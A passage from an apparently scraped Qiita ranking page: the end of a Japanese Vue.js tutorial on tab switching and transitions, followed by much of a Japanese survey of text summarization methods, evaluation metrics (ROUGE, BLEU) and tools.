  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"content-vue"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">transition</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">section</span> <span class="na">v-for</span><span class="o">=</span><span class="s">"item in list"</span> <span class="na">:key</span><span class="o">=</span><span class="s">"item.id"</span> <span class="na">v-if</span><span class="o">=</span><span class="s">"active(item.id)"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>{{ item.content }}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
      <span class="p">&lt;/</span><span class="nt">section</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">transition</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="js">
<div class="code-lang"><span class="bold">JavaScript</span></div>
<div class="highlight"><pre><span></span><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="nx">el</span><span class="o">:</span> <span class="s1">'#app'</span><span class="p">,</span>
  <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">current</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
    <span class="nx">list</span><span class="o">:</span> <span class="p">[{</span>
      <span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
      <span class="nx">label</span><span class="o">:</span> <span class="s1">'menu1'</span><span class="p">,</span>
      <span class="nx">content</span><span class="o">:</span> <span class="s1">'content1'</span>
    <span class="p">},</span> <span class="p">{</span>
      <span class="nx">id</span><span class="o">:</span> <span class="mi">2</span><span class="p">,</span>
      <span class="nx">label</span><span class="o">:</span> <span class="s1">'menu2'</span><span class="p">,</span>
      <span class="nx">content</span><span class="o">:</span> <span class="s1">'content2'</span>
    <span class="p">},</span> <span class="p">{</span>
      <span class="nx">id</span><span class="o">:</span> <span class="mi">3</span><span class="p">,</span>
      <span class="nx">label</span><span class="o">:</span> <span class="s1">'menu3'</span><span class="p">,</span>
      <span class="nx">content</span><span class="o">:</span> <span class="s1">'content3'</span>
    <span class="p">}]</span>
  <span class="p">},</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">active</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">current</span> <span class="o">==</span> <span class="nx">id</span>
    <span class="p">},</span>
    <span class="nx">changeTab</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">current</span> <span class="o">=</span> <span class="nx">id</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">})</span>
</pre></div>
</div>

<p>Vue.js はテンプレートにも <code>v-if</code> という条件分岐が書けるのでアクティブな ID のコンテンツだけを表示させます。</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">section</span> <span class="na">v-for</span><span class="o">=</span><span class="s">"item in list"</span> <span class="na">:key</span><span class="o">=</span><span class="s">"item.id"</span> <span class="na">v-if</span><span class="o">=</span><span class="s">"active(item.id)"</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>{{ item.content }}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">section</span><span class="p">&gt;</span>
</pre></div></div>

<p>そして切り替えトランジションは <code>&lt;transition&gt;</code> で囲むだけで Vue が時間を管理し切り替えが始まったな～というタイミングでクラスが付き、終わったな～というタイミングで <code>display:none</code> や要素が削除されるので、あとは提供されたクラスにスタイルをつければいい。 </p>

<div class="code-frame" data-lang="css">
<div class="code-lang"><span class="bold">CSS</span></div>
<div class="highlight"><pre><span></span><span class="p">.</span><span class="nc">v-enter-active</span><span class="o">,</span> <span class="p">.</span><span class="nc">v-leave-active</span> <span class="p">{</span>
  <span class="k">transition</span><span class="p">:</span> <span class="kc">all</span> <span class="mf">.8</span><span class="kt">s</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">.</span><span class="nc">v-leave-active</span> <span class="p">{</span>
  <span class="k">position</span><span class="p">:</span> <span class="kc">absolute</span><span class="p">;</span>
<span class="p">}</span>

<span class="c">/* 表示されるときは左から */</span>
<span class="p">.</span><span class="nc">v-enter</span> <span class="p">{</span>
  <span class="k">transform</span><span class="p">:</span> <span class="nb">translateX</span><span class="p">(</span><span class="mi">-20</span><span class="kt">px</span><span class="p">);</span>
  <span class="k">opacity</span><span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="c">/* 消えるときは上へ */</span>
<span class="p">.</span><span class="nc">v-leave-to</span> <span class="p">{</span>
  <span class="k">transform</span><span class="p">:</span> <span class="nb">translateY</span><span class="p">(</span><span class="mi">-20</span><span class="kt">px</span><span class="p">);</span>
  <span class="k">opacity</span><span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<p>複雑なトランジションが作れるし、もう <code>display:none</code> に悩まされる事はないですね。</p>

<p>リスト要素の場合でも <code>transition-group</code> というタグに変えると同じように動きを付けることが出来ます。公式にいくつかサンプルがあるのだけど、オリジナルの動きも CSS 部分を変えるだけで簡単に作れるのでかなり面白いです。</p>

<p><img alt=":mushroom:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/1f344.png" title=":mushroom:" width="20"> <a href="https://jp.vuejs.org/v2/guide/transitions.html#%E3%83%AA%E3%82%B9%E3%83%88%E7%A7%BB%E5%8B%95%E3%83%88%E3%83%A9%E3%83%B3%E3%82%B8%E3%82%B7%E3%83%A7%E3%83%B3" rel="nofollow noopener" target="_blank">公式ガイド リスト移動トランジション</a></p>

<p>ちなみに <code>@click="..."</code> とか <code>v-for</code> とかごちゃごちゃ書かれてますがテンプレートはコンパイルされるので出力される DOM には入りません。</p>

<h1>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h1>

<p>作るページによって使い分けるのもいいと思います。個人的にはトランジションが楽なので何か動きが入れば割りと気軽に Vue を使ってます。</p>

<p>Vue.js と似たようなデータバインディング系のライブラリは他にもいろいろあるので、自分にあったライブラリを使うといいです。個人的には Vue.js は入門のハードルも低いし、追々大きなシステムにも対応出来るし、一番大事なとこで使ってて凄く楽しいのでオススメです。</p>

<p>Vue.js は 公式マニュアルの日本語翻訳率とスピードが早いので、まずは公式マニュアルを読むのが一番正確だし間違いないです。それにプラスして色んな方が書いた Tips も沢山あるので探してみてください。私も書いているのでぜひ見てくださいね～(•ө•)ﾉ</p>

<p><img alt=":mushroom:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/1f344.png" title=":mushroom:" width="20"> <a href="https://jp.vuejs.org/v2/guide/" rel="nofollow noopener" target="_blank">Vue.js 日本公式ガイド</a><br>
<img alt=":mushroom:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/1f344.png" title=":mushroom:" width="20"> <a href="http://chibinowa.net/note/#!378" rel="nofollow noopener" target="_blank">私のブログ #Vue.js</a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">24位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>398</kbd>
		<a target="_blank" href="https://qiita.com/icoxfog417/items/d06651db10e27220c819">大自然言語時代のための、文章要約</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-18<br />15:22:25</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/25990.html">icoxfog417</a>(145件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25990/profile-images/1484303516">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Python]</b> <b>[自然言語処理]</b> <b>[機械学習]</b> <b>[MachineLearning]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>さまざまなニュースアプリ、ブログ、SNSと近年テキストの情報はますます増えています。日々たくさんの情報が配信されるため、Twitterやまとめサイトを見ていたら数時間たっていた・・・なんてこともよくあると思います。世はまさに大自然言語時代。</p>

<p><a href="https://camo.qiitausercontent.com/890215ed7d661fea6ffd4facea8a987820a6caa6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f37643965306231372d646530642d323431632d366439652d6536313265616634333066302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/890215ed7d661fea6ffd4facea8a987820a6caa6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f37643965306231372d646530642d323431632d366439652d6536313265616634333066302e706e67" alt="growth_of_data.PNG" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25990/7d9e0b17-de0d-241c-6d9e-e612eaf430f0.png"></a><br>
<em>from <a href="https://www.signiant.com/articles/file-transfer/the-historical-growth-of-data-why-we-need-a-faster-transfer-solution-for-large-data-sets/" rel="nofollow noopener" target="_blank">THE HISTORICAL GROWTH OF DATA: WHY WE NEED A FASTER TRANSFER SOLUTION FOR LARGE DATA SETS</a><br>
テキスト、音声、画像、動画といった非構造データの増加を示したグラフ</em></p>

<p>そこで注目される技術が、「要約」です。膨大な情報を要点をまとめた短い文章にすることができれば、単純に時間の節約になるだけでなく、多様な視点から書かれた情報を並べて吟味することもできます。<br>
本文書は、この文書要約(Text Summarization)についてその概観を示すことを目的として書かれています。具体的には、以下の順に沿って解説をしていきます。</p>

<ol>
<li>要約というタスクの種類</li>
<li>要約を作成する手法</li>
<li>良い要約の評価</li>
<li>要約の作成に使えるツール</li>
<li>要約を試すためのデータセット</li>
</ol>

<h1>
<span id="1-要約というタスクの種類" class="fragment"></span><a href="#1-%E8%A6%81%E7%B4%84%E3%81%A8%E3%81%84%E3%81%86%E3%82%BF%E3%82%B9%E3%82%AF%E3%81%AE%E7%A8%AE%E9%A1%9E"><i class="fa fa-link"></i></a>1. 要約というタスクの種類</h1>

<p>単純に「要約」といっても、いろいろな種類があるためまずはそれらを整理します。今後要約に取り組みたいと思ったときに、どんな「要約」に挑戦しようとしているのかをはっきりさせる足掛かりにしていただければと思います。</p>

<p>要約というタスクを整理する観点としては、3つの観点があります。</p>

<p><a href="https://camo.qiitausercontent.com/5cfb665efb466e7d67cc6529db68fee691aee663/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f30653635343863642d373231312d346466612d616130372d6330663465396561343931322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5cfb665efb466e7d67cc6529db68fee691aee663/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f30653635343863642d373231312d346466612d616130372d6330663465396561343931322e706e67" alt="summarization_task.PNG" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25990/0e6548cd-7211-4dfa-aa07-c0f4e9ea4912.png"></a></p>

<ol>
<li>要約のインプットとなる文書</li>
<li>要約作成に対する意思入れ</li>
<li>作成される要約の内容</li>
</ol>

<p>第一に、要約するのは単一の文書なのか、複数の文書なのかといった観点があります。単一の場合は<strong>Single document summarization</strong>、複数の場合は<strong>Multi-document summarization</strong>と呼ばれます。</p>

<p>第二に、要約に際して何らかの指示を与えるかという観点があります。何も指示をせず単純に要約を作成する処理を<strong>Generic summarization</strong>と呼びます。これに対して、何らかのトピックやキーワードを指定してそれを中心とした要約を作成させることを<strong>Query focused summarization</strong>と呼びます。この特殊なケースとして、文章の更新前後の差分に着目する<strong>Update summarization</strong>があります。これは例えば、メールの要約を行う際に前回のメールとの差分に特に注目して要約を行うといったようなタスクになります。<br>
実用的な側面としては、指示を与えない単純な要約(Generic summarization)は意味がないという議論もあります(<a href="https://www.cl.cam.ac.uk/archive/ksj21/ksjdigipapers/summbook99.pdf" rel="nofollow noopener" target="_blank">Automatic summarizing: factors and directions</a>)。これは個人的にはかなり共感する意見です(実際作成してみた要約を見ると特にそう感じます)。</p>

<p>最後に、作成する要約の内容、スタイルについての観点があります。内容については、例えば書籍や映画を紹介するために要約する場合、ネタバレしてしまうと困るでしょう。その場合内容全体まではわからないように要約を作成することになりますが、こうした要約を<strong>Indicative summary</strong>と呼びます。これとは逆に、すべての内容をもとに作成する要約を<strong>Informative summary</strong>と呼びます。<br>
要約のスタイルは、長さや形式といった観点です。特に一行でまとめるような要約を<strong>Headline summary</strong>と呼びます。また文ではなく、単語だけを抽出するようなスタイルを<strong>Keyword summary</strong>と呼びます。</p>

<p>要約に取り組む際は、これら3つの観点を元にどういったタスクかを定義することで、先行研究の調査が行いやすくなります。</p>

<h1>
<span id="2-要約を作成する手法" class="fragment"></span><a href="#2-%E8%A6%81%E7%B4%84%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B%E6%89%8B%E6%B3%95"><i class="fa fa-link"></i></a>2. 要約を作成する手法</h1>

<p>要約を作成するには、主に抽出型(Extractive)と抽象型(Abstractive)の2つのアプローチがあります。本節では、各アプローチの概要とその代表的なアルゴリズムについて解説を行います。</p>

<h2>
<span id="21-抽出型extractive" class="fragment"></span><a href="#21-%E6%8A%BD%E5%87%BA%E5%9E%8Bextractive"><i class="fa fa-link"></i></a>2.1 抽出型(Extractive)</h2>

<p>抽出型は、要約対象の文章の中から重要と思われる文を抽出して要約を作成するというアプローチです。そのメリットとデメリットは、以下のようになります。</p>

<ul>
<li>メリット： 元の文章中にある文を選択して要約を作成するため、まったく内容がつかめない要約になる可能性が低く、文法的におかしな要約になることもない</li>
<li>デメリット： 文中にない単語を利用することはできないため、抽象化や言い換え、読みやすくするための接続詞の使用などができない。このため、作成された要約は粗雑な印象になる。</li>
</ul>

<p>続いて、抽出型の代表的な手法をいくつか紹介します。</p>

<h3>
<span id="211-graph-base-methods" class="fragment"></span><a href="#211-graph-base-methods"><i class="fa fa-link"></i></a>2.1.1 Graph Base Methods</h3>

<p>グラフベースの手法は、文章をグラフ構造で表現し各ノード(=文や単語)の関係性を元に要約を作成するという手法です。代表的なアルゴリズムとしては、<a href="https://web.eecs.umich.edu/%7Emihalcea/papers/mihalcea.emnlp04.pdf" rel="nofollow noopener" target="_blank">TextRank</a>があります。TextRankは、Google検索の基礎となっている<a href="https://en.wikipedia.org/wiki/PageRank" rel="nofollow noopener" target="_blank">PageRank</a>という手法を文章に応用した手法です。PageRankの基本的な考えは、リンクされているページは良いページで、さらに多くリンクされているページ(=人気のページ)からのリンクは高く評価されるというものです。この評価は、ページに対するユーザーの流入量と等価になります(多くのページからリンクが張られていれば流入しやすく、人気のページからの流入は通常のページからの流入より大きい)。ページ間のリンクは行列で表現することができ、各ページにおけるリンクの総数で割ることでこの行列はユーザーがそのページからリンクが張られた別のページに遷移する確率の行列になります(下図$M$)。これを利用し、ユーザーが各ページに滞在する確率(下図$P$)=ページの評価を求めることがPageRankの目的です。</p>

<p><a href="https://camo.qiitausercontent.com/62485ee6e3e9cbe420acb6d133bb29d4ec8c9195/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f62336439636339632d373862322d616532342d386339362d3864663464626539303661642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/62485ee6e3e9cbe420acb6d133bb29d4ec8c9195/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f62336439636339632d373862322d616532342d386339362d3864663464626539303661642e706e67" alt="page_rank_2.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25990/b3d9cc9c-78b2-ae24-8c96-8df4dbe906ad.png"></a></p>

<p>$P$を求めるには、固有値問題を解く方法とページ遷移の試行を繰り返す方法の2つのアプローチがあります。何れも、多くの回数ページ遷移を繰り返していけば、最終的にページの滞在確率は安定する($MP=P$が成立する)という前提に基づいています。固有値問題を解く方法はこれを実現する$P$を直接求めることができますが、行列のサイズが大きくなると解くのにすごく時間がかかります。試行ベースの方は、一発では解けませんがページ数が多い場合でも$P$を求めることができます。<br>
PageRankの説明が長くなりましたが、TextRankはこれを文章に応用した手法になります。TextRankのポイントは以下の2点です。</p>

<ul>
<li>何をNodeとするか：単語、文etc..</li>
<li>何をEdgeとするか：単語/文の類似度、参照関係etc</li>
</ul>

<p>この定義が決まれば、あとはPageRankと同じ手法で解くことができます。なお、<a href="https://www.cs.cmu.edu/afs/cs/project/jair/pub/volume22/erkan04a-html/erkan04a.html" rel="nofollow noopener" target="_blank">LexRank</a>はNodeに文、Edge/Weightに類似度を使用した手法になります。</p>

<p><a href="https://camo.qiitausercontent.com/5deebd245f373d0df4c492a6d6c3e6e19a694a7e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f37336638653132652d633138362d396430312d313435312d3962326237656638363538362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5deebd245f373d0df4c492a6d6c3e6e19a694a7e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f37336638653132652d633138362d396430312d313435312d3962326237656638363538362e706e67" alt="lexrank.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25990/73f8e12e-c186-9d01-1451-9b2b7ef86586.png"></a></p>

<h3>
<span id="212-feature-base-methods" class="fragment"></span><a href="#212-feature-base-methods"><i class="fa fa-link"></i></a>2.1.2 Feature Base Methods</h3>

<p>文の特徴を定義して、その特徴による重みづけ(スコアリング)を行うことで文選択を行うのがFeature Baseの手法です。例えば、以下の論文がFeature Baseの手法として挙げられます。</p>

<p><a href="http://oldwww.iiit.ac.in/cgi-bin/techreports/display_detail.cgi?id=IIIT/TR/2008/97" rel="nofollow noopener" target="_blank">Sentence Extraction Based Single Document Summarization</a></p>

<p>この論文では、文のスコアリングをした後に、文の選択を行っています。文のスコアリングには、以下の特徴が使用されています。</p>

<ul>
<li>文章における、文の位置</li>
<li>文に動詞が含まれるか否か</li>
<li>文の長さ</li>
<li>単語の出現頻度</li>
<li>単語の固有表現</li>
<li>単語に適用されているフォントスタイル</li>
</ul>

<p>・・・などです。これらの特徴は、以下の計算式で一つのスコアにまとめられます。</p>

<p><a href="https://camo.qiitausercontent.com/654d27b0835799577f4539d5553a31d6481f28d5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f62613366373530622d663465362d623335632d373966622d3537653166616134323830662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/654d27b0835799577f4539d5553a31d6481f28d5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f62613366373530622d663465362d623335632d373966622d3537653166616134323830662e706e67" alt="feature_base_score.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25990/ba3f750b-f4e6-b35c-79fb-57e1faa4280f.png"></a></p>

<p>単語ベースの特徴を掛け合わせて$Score(l, w)$を算出し、文中に含まれる各単語のスコアを合計しています。なお、前の文章への参照を考慮するために、<em>No.of coreferences</em>を使用しています。これは単純に文の前半に含まれる代名詞の数で、代名詞の数分だけ一つ前の文章の平均スコア($Score$を$length$で割った$SPW$)をかけています。<br>
特徴ベースの歴史は古く、古典的な<a href="http://courses.ischool.berkeley.edu/i256/f06/papers/luhn58.pdf" rel="nofollow noopener" target="_blank">Luhn’s Algorithm</a>では、単語の出現頻度から「重要度」を算出し、それが文を区切ったバケットにどれだけ含まれるかでスコアリングを行っています。</p>

<p>続いて、文の選択には算出したスコアだけでなく「選択済み」の文に含まれる単語との一致率が考慮されています。これは、既に選択した文との情報の重複を避けるための工夫です。さらに、そのあと文のつながりを自然にするために疑問形の削除や特定接続詞の削除などを行っています(Refinement)。</p>

<p>なお、文選択のプロセスはFeature Baseだけでなく抽出型全体において重要なプロセスです。というのも、単純にスコアの高い順から文を選択していくと情報の重複などが起こってしまうためです。文選択後のブラッシュアップであるRefinementについても同様のことが言えます。</p>

<h3>
<span id="213-topic-base-methods" class="fragment"></span><a href="#213-topic-base-methods"><i class="fa fa-link"></i></a>2.1.3 Topic Base Methods</h3>

<p>Topic Baseの手法は、文章のトピックを算出し、そのトピックに沿った文を選択するという手法です。重要なトピックに近い文を選択する、各トピックの代表文を選ぶ、などです。Topic Baseの手法については、以下の論文によくまとめられています。</p>

<p><a href="https://www.researchgate.net/publication/220195824_Text_summarization_using_Latent_Semantic_Analysis" rel="nofollow noopener" target="_blank">Text summarization using Latent Semantic Analysis</a></p>

<p>Topic Baseの手法ではLSA(Latent Semantic Analysis)という手法が良く用いられます。これは、縦に文、横に単語をとった文章行列を特異値分解(Singular Value Decomposition=SVD)にかけて、その固有ベクトル(=トピック)を算出するという手法です。以下の図は、SVDを実行して得られた2つのトピック成分上に各文をプロットした図(左)と、各トピックごとに最も高い値を持つ文を選択している図になります(右)。</p>

<p><a href="https://camo.qiitausercontent.com/c5841eb1a392e86bcdade7b69cbdfa173fb413f4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f36663334313233652d336232382d376430652d343137302d3135303263343133323461382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/c5841eb1a392e86bcdade7b69cbdfa173fb413f4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f36663334313233652d336232382d376430652d343137302d3135303263343133323461382e706e67" alt="topic_base.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25990/6f34123e-3b28-7d0e-4170-1502c41324a8.png"></a></p>

<p>特異値分解の結果得られた固有ベクトルや固有値をどのように使って文のスコアを算出するのか、またどのように文を選択していくのか、という点で様々なバリエーションがあります。</p>

<h2>
<span id="22-抽象型abstractive" class="fragment"></span><a href="#22-%E6%8A%BD%E8%B1%A1%E5%9E%8Babstractive"><i class="fa fa-link"></i></a>2.2 抽象型(Abstractive)</h2>

<p>抽象型は、人が要約を作成するときのように、文章の意味を汲み取ったうえで(=抽象化した上で)適切な要約を作成する手法です。そのメリットとデメリットは、以下のようになります。</p>

<ul>
<li>メリット： 元の文中にはない単語を自由に使って要約を作成できるため、より自然な要約を作成できる。また、要約の長さに対する自由度が大きい。</li>
<li>デメリット： 文法的に違和感がなく、また前後の文脈で不整合が生じないような自然な文を生成することが難しい。</li>
</ul>

<p>抽象型の代表的な手法としては、Encoder-Decoderモデルがあります。</p>

<h3>
<span id="221-encoder-decoder-model" class="fragment"></span><a href="#221-encoder-decoder-model"><i class="fa fa-link"></i></a>2.2.1 Encoder-Decoder Model</h3>

<p>Encoder-Decoderモデルは、Encoderで文を潜在表現に圧縮し、Decoderは圧縮された表現から文を生成する、というモデルです。翻訳のタスクでよく使用されるモデルで、翻訳元の文をEncoderで圧縮し、翻訳先の文にDecodeするといった形で利用されています。</p>

<p><a href="https://camo.qiitausercontent.com/3e4315d391094491b8534802c5a98df344f9ae16/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f35316331666565622d666463322d626334322d616564632d3462613532666134633131662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/3e4315d391094491b8534802c5a98df344f9ae16/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f35316331666565622d666463322d626334322d616564632d3462613532666134633131662e706e67" alt="encoder-decoder.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25990/51c1feeb-fdc2-bc42-aedc-4ba52fa4c11f.png"></a><br>
<a href="https://www.slideshare.net/YusukeOda1/encoderdecoder-tis" rel="nofollow noopener" target="_blank">Encoder-decoder 翻訳 (TISハンズオン資料)</a></p>

<p>要約に適用する場合、文章をEncoder入れていきDecoderから要約を生成させる形になります。文章から直接要約を生成するという形になるため、End-to-Endのモデルともいわれます。TensorFlowには、この形式で要約を作成するモデルが組み込まれています。</p>

<p><a href="https://research.googleblog.com/2016/08/text-summarization-with-tensorflow.html" rel="nofollow noopener" target="_blank">Text summarization with TensorFlow</a></p>

<p>なお、抽出型と抽象型のいい所どりをする研究も近年は進められています。以下の研究は、抽出と生成をスイッチする確率p_genを算出しながら要約を作成するとうアイデアです。</p>

<p><a href="https://arxiv.org/abs/1704.04368" rel="nofollow noopener" target="_blank">Get To The Point: Summarization with Pointer-Generator Networks</a></p>

<p><a href="https://camo.qiitausercontent.com/22c73a774131f4f6063ea51fe657b9de42055928/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f61343533373737622d376337322d666561342d623335302d6666653830326364636162312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/22c73a774131f4f6063ea51fe657b9de42055928/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353939302f61343533373737622d376337322d666561342d623335302d6666653830326364636162312e706e67" alt="pointer-generator-network.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25990/a453777b-7c72-fea4-b350-ffe802cdcab1.png"></a></p>

<h1>
<span id="3-良い要約の評価" class="fragment"></span><a href="#3-%E8%89%AF%E3%81%84%E8%A6%81%E7%B4%84%E3%81%AE%E8%A9%95%E4%BE%A1"><i class="fa fa-link"></i></a>3. 良い要約の評価</h1>

<p>要約を評価する観点としては、通常の機械学習と同様適合率(Precision)と再現率(Recall)の観点があります。</p>

<h2>
<span id="31-rouge-nカバー率の評価" class="fragment"></span><a href="#31-rouge-n%E3%82%AB%E3%83%90%E3%83%BC%E7%8E%87%E3%81%AE%E8%A9%95%E4%BE%A1"><i class="fa fa-link"></i></a>3.1 <a href="https://en.wikipedia.org/wiki/ROUGE_(metric)" rel="nofollow noopener" target="_blank">ROUGE-N</a>　カバー率の評価</h2>

<p>ROUGE-NのNはN-gramのNで、生成した要約と人間が作成した要約がN-gram単位でどれだけ一致しているかを計測した指標です。ROUGE-1なら単語単位、ROUGE-2ならbi-gram単位の一致になります。例えば、"いちご ばなな"と"ばなな いちご"は、ROUGE-1単位(単語単位)では一致しますが、ROUGE-2、つまりbi-gramなら"いちご ばなな"が一単位になるため一致はしなくなります。これは即ち正解の要約文中にあるN-gramの組み合わせがどれだけ生成した要約に出てくるかを表しており、乱暴に言えば要約文をすごく長くすればそれだけROUGEスコアは高くなる傾向があります。そうした意味で、ROUGEによる評価はRecall的といえます。もちろん、これだけでは「実際の要約にはない」単語=ミスが評価されません。そこで出てくるのが、次のBLEUスコアです。</p>

<h2>
<span id="32-bleu--一致率の評価" class="fragment"></span><a href="#32-bleu--%E4%B8%80%E8%87%B4%E7%8E%87%E3%81%AE%E8%A9%95%E4%BE%A1"><i class="fa fa-link"></i></a>3.2 <a href="http://www.aclweb.org/anthology/P02-1040.pdf" rel="nofollow noopener" target="_blank">BLEU</a>  一致率の評価</h2>

<p>BLEUは、生成した要約のN-gram中のどれだけが実際の要約に登場するかで評価されます(なお、この場合長い文は短い文に比べてN-gram数が大きくなり不利になるため、調整が行われています)。BLEUは分母に生成した要約のN-gram数が来るため、乱発すればそれだけ一致する率は下がることになります。このため、Precision的な評価が可能になります。なお、BLEUは翻訳のタスクでよく使用されています。</p>

<p>実際には、評価ではROUGEが使われることが多いです。というのも、たいていの場合要約の長さには制限があり、「長々生成してスコアを稼ぐ」という戦略自体が利用できないためです。</p>

<h1>
<span id="4要約の作成に使えるツールデータセット" class="fragment"></span><a href="#4%E8%A6%81%E7%B4%84%E3%81%AE%E4%BD%9C%E6%88%90%E3%81%AB%E4%BD%BF%E3%81%88%E3%82%8B%E3%83%84%E3%83%BC%E3%83%AB%E3%83%87%E3%83%BC%E3%82%BF%E3%82%BB%E3%83%83%E3%83%88"><i class="fa fa-link"></i></a>4.要約の作成に使えるツール・データセット</h1>

<p>要約を作成してみたいという熱が高まったに違いないと思うので、最後に実際に要約を作成できるツールとデータセットを紹介します。</p>

<h2>
<span id="41-ツール" class="fragment"></span><a href="#41-%E3%83%84%E3%83%BC%E3%83%AB"><i class="fa fa-link"></i></a>4.1 ツール</h2>

<p>これまで紹介した、抽出型/抽象型の要約の手法ごとに紹介します。</p>

<p>抽出型(Extractive)</p>

<ul>
<li>Graph Base

<ul>
<li><a href="https://radimrehurek.com/gensim/summarization/summariser.html" rel="nofollow noopener" target="_blank">gensim</a></li>
<li><a href="https://github.com/ceteri/pytextrank" rel="nofollow noopener" target="_blank">pytextrank</a></li>
</ul>
</li>
<li>Feature Base

<ul>
<li>
<a href="https://github.com/MojoJolo/textteaser" rel="nofollow noopener" target="_blank">TextTeaser</a> </li>
<li><a href="https://github.com/xiaoxu193/PyTeaser" rel="nofollow noopener" target="_blank">PyTeaser</a></li>
</ul>
</li>
<li>Topic Base

<ul>
